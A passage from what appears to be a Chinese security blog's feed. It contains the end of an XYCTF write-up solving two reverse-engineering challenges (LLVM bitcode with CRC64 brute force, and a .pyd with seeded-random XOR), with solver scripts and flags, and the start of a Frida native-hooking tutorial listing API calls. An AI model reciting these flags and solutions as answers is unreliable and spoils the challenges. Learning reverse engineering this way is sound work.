class="hljs-string">f&quot;Decrypted Flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>拿到 flag</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">XYCTF&#123;Crypt<span class="hljs-meta">o0</span>_ca<span class="hljs-symbol">n_n0</span>t_S<span class="hljs-meta">o1</span>ve_it&#125;<br></code></pre></td></tr></table></figure><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Dragon"><a href="#Dragon" class="headerlink" title="Dragon"></a>Dragon</h2><p>第一次做关于 LLVM 的题，从 0 到 0.1 的配环境www</p><p>新装的 Ubuntu24.04.02，用这个传一下文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> vmhgfs-fuse .host:/ /mnt/hgfs -o allow_other<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/81b66c7e84b40f35.png"></p><p>拿到 <code>Dragon.bc</code> 文件之后查看文件类型，还能用 Exeinfo PE 看，但是只能得到是关于 LLVM 的，没有具体信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">file Dragon.bc<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/2bb3847b1a687538.png"></p><p><code>Dragon.bc</code> 文件为 LLVM IR bitcode 文件，LLVM 完整编译流程如下：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">源文件<span class="hljs-function"><span class="hljs-params">(.c<span class="hljs-regexp">/.cpp) -&gt; LLVM 前端(clang) -&gt; LLVM IR(.ll/</span>.bc)</span> -&gt;</span> LLVM 中端<span class="hljs-function"><span class="hljs-params">(opt)</span> -&gt;</span> 优化后 IR -&gt; LLVM 后端<span class="hljs-function"><span class="hljs-params">(llc)</span> -&gt;</span> 汇编<span class="hljs-function"><span class="hljs-params">(.s)</span> -&gt;</span> 汇编器 -&gt; 目标文件<span class="hljs-function"><span class="hljs-params">(.o)</span> -&gt;</span> 链接器 -&gt; 可执行文件<br></code></pre></td></tr></table></figure><p>将  <code>bc</code> 文件转换为 object file</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">llc-17 Dragon.bc -filetype=obj -o Dragon.o<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/2e7042491fa0bfd9.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/e5bc7fc8daddfbab.png"></p><p>拿出来丢进 ida 分析，找到 main 函数</p><p><img src="https://img.dkdun.cn/v1/2025/12/a833665883644667.png"></p><p>大概是将 <code>&amp;unk_370</code> 的数据复制到 <code>v7</code> 数组中，然后初始化 Str 数组为0，接着提示用户输入flag，并读取输入到 <code>Str</code>中</p><p>main 函数中还有一个 <code>calculate_crc64_direct()</code> 函数</p><p><img src="https://img.dkdun.cn/v1/2025/12/85cc1c5a6a8741c9.png"></p><p>根据代码中的 <code>0x42F0E1EBA9EA3693</code> 知道实现的是 <code>CRC64</code> 算法，初始值为 <code>0xFFFFFFFFFFFFFFFF</code>，输入数据每个字节被左移 56 位后与当前 CRC 值异或，然后处理每个位，最高位决定是否异或多项式，处理完所有位后，最终结果取反。CRC 算法有两种处理方式：左移（big-endian）或右移（little-endian），根据函数中 <code>a1[i] &lt;&lt; 56</code> 知道这里是左移</p><p>找到 <code>&amp;unk_370</code> 的数据</p><p><img src="https://img.dkdun.cn/v1/2025/12/b95a153f881fcc1b.png"></p><p>把数据提取出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">47h, 7Bh, 9Fh, 41h, 4Eh, 0E3h, 63h, 0DCh, 0C6h, 0BFh, 0B2h, 0E7h, 0D4h, 0F8h, 1Eh, <span class="hljs-number">3</span>, 9Eh, 0D8h, 5Fh, 62h, 0BCh, 2Fh, 0D6h, 12h, 0E8h, 55h, 57h, 0CCh, 0E1h, 0B6h, 0E8h, 83h, 0CCh, 65h, 0B6h, 2Ah, 0EBh, 0B1h, 7Bh, 0FCh, 6Bh, 0D9h, 62h, 2Ah, 1Bh, 0CAh, 82h, 93h, 87h, 0C3h, 73h, 76h, 0A0h, 0F8h, 0FFh, 0B1h, 0E1h, <span class="hljs-number">5</span>, 8Eh, 38h, 27h, 16h, 0A8h, 0Dh, 0B7h, 0AAh, 0D0h, 0E8h, 1Ah, 0E6h, 0F1h, 9Eh, 45h, 61h, 0F2h, 0E7h, 0D2h, 3Fh, 78h, 92h, 0Bh, 0E6h, 6Fh, 0F5h, 0A1h, 7Ch, 0C9h, 63h, 0ABh, 3Ah, 0B7h, 43h, 0B0h, 0A8h, 0D3h, 9Bh<br><br>转为十六进制 -&gt;<br><br><span class="hljs-number">0x47</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0xDC</span>,<br><span class="hljs-number">0xC6</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x03</span>,<br><span class="hljs-number">0x9E</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x12</span>,<br><span class="hljs-number">0xE8</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x83</span>,<br><span class="hljs-number">0xCC</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xFC</span>,<br><span class="hljs-number">0x6B</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x93</span>,<br><span class="hljs-number">0x87</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xB1</span>,<br><span class="hljs-number">0xE1</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x0D</span>,<br><span class="hljs-number">0xB7</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x9E</span>,<br><span class="hljs-number">0x45</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x92</span>,<br><span class="hljs-number">0x0B</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x63</span>,<br><span class="hljs-number">0xAB</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x9B</span><br></code></pre></td></tr></table></figure><p>正向左移那么逆向就需要右移</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> itertools<br><br>hex_data = [<br>    <span class="hljs-number">0x47</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0xDC</span>,<br>    <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x03</span>,<br>    <span class="hljs-number">0x9E</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x12</span>,<br>    <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x83</span>,<br>    <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xFC</span>,<br>    <span class="hljs-number">0x6B</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x93</span>,<br>    <span class="hljs-number">0x87</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xB1</span>,<br>    <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x0D</span>,<br>    <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x9E</span>,<br>    <span class="hljs-number">0x45</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x92</span>,<br>    <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x63</span>,<br>    <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x9B</span><br>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_crc64</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-comment"># CRC64算法实现</span><br>    crc = <span class="hljs-number">0xFFFFFFFFFFFFFFFF</span><br>    poly = <span class="hljs-number">0x42F0E1EBA9EA3693</span><br>    <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> data:<br>        crc ^= (byte &lt;&lt; <span class="hljs-number">56</span>)<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>            <span class="hljs-keyword">if</span> crc &amp; (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">63</span>):<br>                crc = ((crc &lt;&lt; <span class="hljs-number">1</span>) ^ poly) &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFFF</span><br>            <span class="hljs-keyword">else</span>:<br>                crc = (crc &lt;&lt; <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFFF</span><br>    <span class="hljs-keyword">return</span> (~crc) &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFFF</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_flag</span>():<br>    <span class="hljs-comment"># 转换目标校验值（小端序）</span><br>    targets = [<br>        <span class="hljs-built_in">int</span>.from_bytes(<span class="hljs-built_in">bytes</span>(hex_data[i:i+<span class="hljs-number">8</span>]), <span class="hljs-string">&#x27;little&#x27;</span>)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">96</span>, <span class="hljs-number">8</span>)<br>    ]<br>    <br>    <span class="hljs-comment"># 暴力破解</span><br>    <span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm  <span class="hljs-comment"># 进度条库</span><br>    <br>    flag = <span class="hljs-built_in">bytearray</span>()<br>    <span class="hljs-keyword">for</span> idx, target <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(targets, <span class="hljs-number">1</span>):<br>        found = <span class="hljs-literal">False</span><br>        <span class="hljs-comment"># 遍历所有可能的2字节组合</span><br>        <span class="hljs-keyword">for</span> b1, b2 <span class="hljs-keyword">in</span> tqdm(itertools.product(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>), repeat=<span class="hljs-number">2</span>), <br>                          desc=<span class="hljs-string">f&quot;破解第<span class="hljs-subst">&#123;idx&#125;</span>个校验值&quot;</span>, total=<span class="hljs-number">65536</span>):<br>            data = <span class="hljs-built_in">bytes</span>([b1, b2])<br>            <span class="hljs-keyword">if</span> calculate_crc64(data) == target:<br>                flag.extend(data)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n[+] 匹配成功：<span class="hljs-subst">&#123;data&#125;</span> → <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(target)&#125;</span>&quot;</span>)<br>                found = <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> found:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n[-] 未找到匹配项：<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(target)&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span><br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nflag：&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;UTF-8:&quot;</span>, flag.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;replace&#x27;</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;HEX   :&quot;</span>, flag.<span class="hljs-built_in">hex</span>())<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    find_flag()<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/304e1a4aaac8da5c.png"></p><p>拿到 flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;LLVM_1s_Fun_Ri9h7?&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Moon"><a href="#Moon" class="headerlink" title="Moon"></a>Moon</h2><p>这题虽然是 <code>pyd</code> 逆向，但应该是最简单的那一类</p><p>shift+f12 搜索字符串，前面有一些文件</p><p><img src="https://img.dkdun.cn/v1/2025/12/dce64ef35887afcb.png"></p><p>往下看能发现一串可疑字符串 </p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">426</span>b87abd0ceaa3c58761bbb0172606dd8ab064491a2a76af9a93e1ae56fa<span class="hljs-number">84206a2f7</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/5c5179cbd58daed5.png"></p><p>跟进定位到 <code>sub_180002550()</code> 函数</p><p><img src="https://img.dkdun.cn/v1/2025/12/ee0a1d52877ac94b.png"></p><p>把里面关键字符串提取出来：</p><p>加密相关：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">v9[<span class="hljs-number">1</span>] <span class="hljs-operator">=</span> <span class="hljs-string">&quot;426b87abd0ceaa3c58761bbb0172606dd8ab064491a2a76af9a93e1ae56fa84206a2f7&quot;</span><span class="hljs-comment">;</span><br><span class="hljs-attribute">v80</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;encrypted&quot;</span><span class="hljs-comment">;</span><br><span class="hljs-attribute">v179</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;xor_crypt&quot;</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>模块加载：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">v14</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SEED&quot;</span><br><span class="hljs-attribute">v20</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;TARGET_HEX&quot;</span><br><span class="hljs-attribute">v135</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;randint&quot;</span><br><span class="hljs-attribute">v141</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;random&quot;</span>    // 使用Python random模块<br><span class="hljs-attribute">v146</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;seed&quot;</span>      <br><span class="hljs-attribute">v152</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;seed_value&quot;</span>      // 随机数种子配置<br></code></pre></td></tr></table></figure><p>可以看到有 <code>xor</code> 加密，继续看能在 <code>sub_180001370()</code> 函数找到了关于 <code>Xor</code> 的信息，有一个 <code>PyNumber_Xor()</code> ，将 <code>v4</code>  和 <code>v8</code> 异或返回 <code>v5</code>，然后将 <code>v5</code> 添加到 list 中</p><p><img src="https://img.dkdun.cn/v1/2025/12/8e9648d0940a93f4.png"></p><p>仔细分析 <code>sub_180001370()</code> 函数中的 <code>v8</code> 来源：</p><p><img src="https://img.dkdun.cn/v1/2025/12/edc4e1380303b4cb.png"></p><p>这里通过 <code>PyDict_GetItem_KnownHash</code> 从 <code>off_18000B618</code> 指向的字典中获取项</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">Item_KnownHash = PyDict_GetItem_KnownHash(*off_18000B618, v11, *(v11 + <span class="hljs-number">24</span>));<br></code></pre></td></tr></table></figure><p>通过代码可以发现 <code>v8</code> 的核心来源是 <code>off_18000B618</code> 指向的模块全局字典</p><p>然后交叉引用 <code>off_18000B618</code> 发现被 <code>sub_180003010()</code> 函数多次引用</p><p><img src="https://img.dkdun.cn/v1/2025/12/6ed655fdf91ec8a5.png"></p><p>跟进来到 <code>sub_180003010()</code> 函数，在 <code>PyLong_FromLong()</code>  函数中找到了随机数种子 <code>1131796</code>，这个 <code>PyLong_FromLong()</code> 函数是一个构造函数，主要是对数值进行处理</p><p><img src="https://img.dkdun.cn/v1/2025/12/ab2e4aa482937b76.png"></p><p>因此可以得到如下信息：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">密文：<span class="hljs-number">426</span>b87abd0ceaa3c58761bbb0172606dd8ab064491a2a76af9a93e1ae56fa<span class="hljs-number">84206a2f7</span><br>加密的随机数种子值：<span class="hljs-number">1131796</span><br>加密方式：异或<br></code></pre></td></tr></table></figure><p>所以程序主要逆向逻辑：使用固定的随机数种子 <code>1131796</code>，生成和密文长度一样的密钥然后再和密文异或得到明文</p><p>逆向脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><br><span class="hljs-comment"># 设置固定种子</span><br>random.seed(<span class="hljs-number">1131796</span>)<br><br><span class="hljs-comment"># 密文（64字节HEX字符串）</span><br>encrypted_hex = <span class="hljs-string">&quot;426b87abd0ceaa3c58761bbb0172606dd8ab064491a2a76af9a93e1ae56fa84206a2f7&quot;</span><br>encrypted_bytes = <span class="hljs-built_in">bytes</span>.fromhex(encrypted_hex)<br><br><span class="hljs-comment"># 生成等长随机密钥</span><br>key = [random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(encrypted_bytes))]<br><br><span class="hljs-comment"># 异或解密</span><br>flag_bytes = <span class="hljs-built_in">bytes</span>([encrypted_bytes[i] ^ key[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(encrypted_bytes))])<br><br><span class="hljs-comment"># 输出flag</span><br><span class="hljs-built_in">print</span>(flag_bytes.decode())<br></code></pre></td></tr></table></figure><p>拿到 flag</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">flag&#123;<span class="hljs-symbol">but_y0u_l00k3d_up_@</span>t_th3_mOOn&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>比赛</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>重生之我要成为 Frida 糕手:关于 Frida Native 层 Hook</title>
    <link href="/2025/04/03/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E8%A6%81%E6%88%90%E4%B8%BA-Frida-%E7%B3%95%E6%89%8B-%E5%85%B3%E4%BA%8E-Frida-Native-%E5%B1%82-Hook/"/>
    <url>/2025/04/03/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E8%A6%81%E6%88%90%E4%B8%BA-Frida-%E7%B3%95%E6%89%8B-%E5%85%B3%E4%BA%8E-Frida-Native-%E5%B1%82-Hook/</url>
    
    <content type="html"><![CDATA[<p>Hook Native 层调用的函数并读取传入的参数、Hook 修改 Native 层函数的返回值、主动调用 Native 层未被调用的方法</p><span id="more"></span><h1 id="Process、Module、Memory"><a href="#Process、Module、Memory" class="headerlink" title="Process、Module、Memory"></a>Process、Module、Memory</h1><p>参考 52 的正己师傅的文章：<a href="https://www.52pojie.cn/thread-1840174-1-1.html"><strong>《安卓逆向这档事》十五、是时候学习一下Frida一把梭了(下)</strong> </a></p><h2 id="1、Process"><a href="#1、Process" class="headerlink" title="1、Process"></a>1、Process</h2><p><code>Process</code> 对象代表当前被 hook 的进程，能获取进程的信息，枚举模块、范围等</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Process</span>.<span class="hljs-property">id</span>返回附加进程的 <span class="hljs-variable constant_">PID</span><br><span class="hljs-title class_">Process</span>.<span class="hljs-title function_">isDebuggerAttached</span>()检测当前是否对目标程序已经附加<br><span class="hljs-title class_">Process</span>.<span class="hljs-title function_">enumerateMedules</span>()枚举当前加载模块，返回模块对象数组<br><span class="hljs-title class_">Process</span>.<span class="hljs-title function_">enumerateThreads</span>()枚举当前所有的线程，返回包含 id，state，context 等属性的对象数组<br></code></pre></td></tr></table></figure><h2 id="2、Module"><a href="#2、Module" class="headerlink" title="2、Module"></a>2、Module</h2><p><code>Module</code> 对象代表加载到进程的模块，能查询模块的信息，如模块的基址、名称、导入、导出函数等</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Module</span>.<span class="hljs-title function_">load</span>()加载指定 so 文件，返回一个 <span class="hljs-title class_">Module</span> 对象<br><span class="hljs-title function_">enumerateImports</span>()枚举所有的 <span class="hljs-title class_">Import</span> 库函数，返回 <span class="hljs-title class_">Module</span> 数组对象<br><span class="hljs-title function_">enumerateExports</span>()枚举所有的 <span class="hljs-title class_">Export</span> 库函数，返回 <span class="hljs-title class_">Module</span> 数组对象<br><span class="hljs-title function_">enumerateSymbols</span>()枚举所有的 <span class="hljs-title class_">Symbol</span> 库函数，返回 <span class="hljs-title class_">Module</span> 数组对象<br><span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(exportName)、<span class="hljs-title class_">Module</span>.<span class="hljs-title function_">getExportByName</span>(exportName)寻找指定 so 中 <span class="hljs-keyword">export</span> 库中函数地址<br><span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findBaseAddress</span>(name)、<span class="hljs-title class_">Module</span>.<span class="hljs-title function_">getBaseAddress</span>(name)返回 so 的基地址<br></code></pre></td></tr></table></figure><h2 id="3、Memory"><a href="#3、Memory" class="headerlink" title="3、Memory"></a>3、Memory</h2><p><code>Memory</code> 提供直接读取和修改进程内存的功能，能够读取特定地址的值、写入数据、分配内存等</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">copy</span>()复制内存<br><span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">scan</span>()搜索内存中特定模式的数据<br><span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">scanSync</span>()搜索内存中特定模式的数据，返回多个匹配数据<br><span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">alloc</span>()在目标进程的堆上申请指定大小的内存，返回一个 <span class="hljs-title class_">NativePointer</span><br><span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">writeByteArray</span>()将字节数组写入一个指定内存<br><span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readByteArray</span>()读取内存<br></code></pre></td></tr></table></figure><h1 